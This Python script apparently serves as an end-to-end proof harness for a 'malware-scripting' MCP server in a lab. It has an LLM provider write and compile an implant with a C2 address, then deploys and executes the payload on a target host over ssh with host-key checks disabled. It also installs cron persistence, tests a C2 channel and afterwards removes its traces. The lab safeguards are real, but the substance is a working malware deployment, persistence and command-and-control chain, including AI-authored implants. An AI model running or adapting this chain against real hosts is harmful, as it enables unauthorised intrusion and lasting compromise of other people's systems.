#!/usr/bin/env python3
"""Prove the malware-scripting MCP's chain end to end against a live lab guest.

Opt-in and fail-closed. It needs guest credentials and a target the operator
names explicitly; with either missing it prints why and exits non-zero rather
than guessing:

    LAB_SSH_USER=svc_backup LAB_SSH_PASS=... \
        python3 scripts/live_proof.py --target 10.99.50.41

What it does, in order, and what each step has to show:

  generate   (optional, --generate) stand-in for an authored implant: asks the
             configured OpenAI-compatible provider to write the C, then compiles
             it. Skipped unless a provider is configured.
  deploy     payload copied to the guest and executed there by the deployer
  execute    the guest's own output read back over a *separate* ssh session,
             plus the beacon file the payload wrote
  persist    one mechanism installed on the guest, with the lifecycle facts it
             did and did not establish (the callback is never claimed here)
  c2         the channel report
  cleanup    the persistence entry and the payload removed again, then verified
             gone

Every step prints `ok`/`FAILED` with its evidence. Nothing is inferred from the
tool's own success flag alone: deploy and execute are cross-checked over ssh,
and cleanup is verified by reading the guest back.

The guest is left as it was found (the cron entry and the payload removed); the
beacon file is removed too.
"""

from __future__ import annotations

import argparse
import json
import os
import selectors
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
SERVER = HERE.parent / "mcp-malware-generator.py"
PROBE_C = HERE / "probe_payload.c"

GUEST_PAYLOAD = "/tmp/evilkit_probe"
GUEST_BEACON = "/tmp/evilkit_proof.beacon"
CRON_MARKER = "evilkit-persist"

OK = "ok"
FAILED = "FAILED"


class Results:
    def __init__(self) -> None:
        self.rows: list[tuple[str, str, str]] = []

    def add(self, step: str, state: str, evidence: str) -> None:
        self.rows.append((step, state, evidence))
        print(f"[{state:>6}] {step}: {evidence}", flush=True)

    @property
    def failed(self) -> list[tuple[str, str, str]]:
        return [row for row in self.rows if row[1] == FAILED]


class McpClient:
    """Minimal stdio JSON-RPC client — the same wire the CLI speaks."""

    def __init__(self, env: dict[str, str]) -> None:
        self.proc = subprocess.Popen(
            [sys.executable, str(SERVER)],
            cwd=str(SERVER.parent),
            env=env,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        self._id = 0
        self._sel = selectors.DefaultSelector()
        self._sel.register(self.proc.stdout, selectors.EVENT_READ)
        self.call("initialize", {
            "protocolVersion": "2025-06-18",
            "capabilities": {},
            "clientInfo": {"name": "live-proof", "version": "0"},
        })
        self._send({"jsonrpc": "2.0", "method": "notifications/initialized"})

    def _send(self, msg: dict) -> None:
        self.proc.stdin.write(json.dumps(msg) + "\n")
        self.proc.stdin.flush()

    def _next_id(self) -> int:
        self._id += 1
        return self._id

    def call(self, method: str, params: dict | None = None, timeout: float = 300.0) -> dict:
        req_id = self._next_id()
        msg = {"jsonrpc": "2.0", "id": req_id, "method": method}
        if params is not None:
            msg["params"] = params
        self._send(msg)
        deadline = time.time() + timeout
        while True:
            if self.proc.poll() is not None:
                raise RuntimeError(f"the MCP server exited during {method}")
            remaining = deadline - time.time()
            if remaining <= 0:
                raise TimeoutError(f"{method} did not answer within {timeout:.0f}s")
            if not self._sel.select(timeout=min(0.5, remaining)):
                continue
            line = self.proc.stdout.readline()
            if not line:
                continue
            line = line.strip()
            if not line:
                continue
            try:
                resp = json.loads(line)
            except json.JSONDecodeError:
                continue
            if resp.get("id") == req_id:
                return resp

    def tool(self, name: str, args: dict | None = None, timeout: float = 300.0) -> tuple[int | None, str]:
        """Return (error_code, text) — code None on success."""
        resp = self.call("tools/call", {"name": name, "arguments": args or {}}, timeout=timeout)
        if "error" in resp:
            return resp["error"].get("code"), resp["error"].get("message", "")
        return None, resp["result"]["content"][0]["text"]

    def close(self) -> None:
        try:
            self.proc.stdin.close()
        except Exception:
            pass
        if self.proc.poll() is None:
            self.proc.terminate()
            try:
                self.proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.proc.kill()


def ssh_argv(user: str, password: str, key: str, target: str, command: str) -> list[str]:
    base = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ConnectTimeout=10", "-o", "BatchMode=" + ("no" if password else "yes")]
    if key:
        base += ["-i", os.path.expanduser(key)]
    if password:
        base = ["sshpass", "-p", password, *base]
    return [*base, f"{user}@{target}", command]


def guest_run(user: str, password: str, key: str, target: str, command: str,
              timeout: float = 60.0) -> tuple[int, str]:
    proc = subprocess.run(ssh_argv(user, password, key, target, command),
                          capture_output=True, text=True, timeout=timeout)
    return proc.returncode, (proc.stdout + proc.stderr).strip()


def build_payload(workdir: Path) -> Path:
    binary = workdir / "evilkit_probe"
    proc = subprocess.run(["gcc", "-O0", "-o", str(binary), str(PROBE_C)],
                          capture_output=True, text=True, timeout=60)
    if proc.returncode != 0:
        raise RuntimeError(f"gcc failed: {proc.stderr.strip()[:300]}")
    return binary


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--target", required=True, help="lab guest to prove the chain against")
    parser.add_argument("--generate", action="store_true",
                        help="also prove malware_generate by having the configured provider "
                             "write the source (needs EVILKIT_OPERATOR_URL and a key)")
    parser.add_argument("--mechanism", default="cron",
                        help="persistence mechanism to install (default: cron)")
    parser.add_argument("--keep", action="store_true",
                        help="leave the payload and persistence in place (do not clean up)")
    args = parser.parse_args(argv)

    user = os.environ.get("LAB_SSH_USER", "")
    password = os.environ.get("LAB_SSH_PASS", "")
    key = os.environ.get("LAB_SSH_KEY", "")
    if not user or not (password or key):
        print("live_proof: LAB_SSH_USER plus LAB_SSH_PASS or LAB_SSH_KEY must be set; "
              "refusing to guess guest credentials", file=sys.stderr)
        return 2
    for tool in ("ssh", "gcc"):
        if shutil.which(tool) is None:
            print(f"live_proof: {tool} is not on PATH", file=sys.stderr)
            return 2
    if password and shutil.which("sshpass") is None:
        print("live_proof: sshpass is needed for a password login", file=sys.stderr)
        return 2

    results = Results()
    target = args.target
    workdir = Path(tempfile.mkdtemp(prefix="evilkit-live-proof-"))
    client = McpClient(dict(os.environ))

    try:
        # --- generate (optional) ------------------------------------------------
        if args.generate:
            code, text = client.tool("malware_generate", {
                "c2_addr": "192.168.0.10:14444",
                "targets": target,
                "payload_type": "recon",
                "output_dir": str(workdir / "gen"),
            }, timeout=300)
            results.add("generate", OK if code is None else FAILED,
                        (text or str(code)).strip().splitlines()[0][:160])

        payload = build_payload(workdir)
        results.add("payload", OK, f"compiled probe at {payload} (stands in for a generated implant)")

        # --- deploy -------------------------------------------------------------
        code, text = client.tool("malware_deploy", {
            "payload_path": str(payload),
            "target_vms": [target],
            "remote_path": GUEST_PAYLOAD,
            "execute": True,
        }, timeout=300)
        results.add("deploy", OK if code is None and target in text else FAILED,
                    (text or str(code)).strip().replace("\n", " | ")[:200])

        # --- execute (cross-checked over ssh, not the tool's own word) ----------
        marker = f"proof-{int(time.time())}"
        rc, out = guest_run(user, password, key, target,
                            f"{GUEST_PAYLOAD} --help >/dev/null 2>&1; "
                            f"tail -n 1 {GUEST_BEACON} 2>/dev/null; echo marker={marker}")
        executed = rc == 0 and "evilkit-probe" not in out and marker in out and "host=files01" in out
        rc2, out2 = guest_run(user, password, key, target,
                              f"{GUEST_PAYLOAD}; echo ---; cat {GUEST_BEACON} 2>/dev/null")
        ran = "evilkit-probe running" in out2 and "uid=1000" in out2
        results.add("execute", OK if (ran and executed) else FAILED,
                    f"guest ran it: {out2.splitlines()[0][:90] if out2 else 'no output'} "
                    f"| beacon: {'present' if 'pid=' in out2 else 'MISSING'}")

        # --- persist ------------------------------------------------------------
        code, text = client.tool("malware_persist", {
            "host": target, "payload": GUEST_PAYLOAD, "mechanisms": args.mechanism,
        }, timeout=300)
        installed = code is None and "persistence_installed" in text
        rc3, out3 = guest_run(user, password, key, target,
                              f"crontab -l 2>/dev/null | grep -c {CRON_MARKER}")
        present = rc3 == 0 and out3.strip() not in ("", "0")
        results.add("persist", OK if (installed and present) else FAILED,
                    f"tool reported installed={installed}, guest crontab holds "
                    f"{out3.strip() or '0'} entry; missing facts: "
                    f"{'callback' if 'callback' in text else 'none listed'}")
        print("      persist detail: " + " | ".join(
            line.strip() for line in text.splitlines() if line.strip())[:600], flush=True)

        # --- c2 -----------------------------------------------------------------
        code, text = client.tool("malware_c2", {"test_failover": False, "tcp_port": 4444}, timeout=120)
        channels = ""
        if code is None:
            try:
                channels = ",".join(
                    f"{ch['name']}={'up' if ch['active'] else 'down'}"
                    for ch in json.loads(text).get("channels", [])
                )
            except (ValueError, KeyError):
                channels = text.strip()[:120]
        results.add("c2", OK if code is None else FAILED, channels or str(code))
    finally:
        # --- cleanup (always) ---------------------------------------------------
        if not args.keep:
            guest_run(user, password, key, target,
                      f"crontab -l 2>/dev/null | grep -v {CRON_MARKER} | crontab - ; "
                      f"rm -f {GUEST_PAYLOAD} {GUEST_BEACON}; echo cleaned")
            rc4, out4 = guest_run(user, password, key, target,
                                  f"crontab -l 2>/dev/null | grep -c {CRON_MARKER}; "
                                  f"ls {GUEST_PAYLOAD} 2>&1 | tail -1")
            gone = out4.splitlines()[:1] == ["0"] and "No such file" in out4
            results.add("cleanup", OK if gone else FAILED,
                        f"cron entries left={out4.splitlines()[0] if out4 else '?'}, "
                        f"payload={'removed' if 'No such file' in out4 else 'PRESENT'}")
        client.close()

    print()
    width = max(len(step) for step, _, _ in results.rows)
    for step, state, evidence in results.rows:
        print(f"  {step:<{width}}  {state:<6}  {evidence[:120]}")
    if results.failed:
        print(f"\n{len(results.failed)} step(s) did not do what they claim: "
              + ", ".join(step for step, _, _ in results.failed))
        return 1
    print("\nwhole chain proven: deploy → execute → persist → c2 (and cleaned up)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
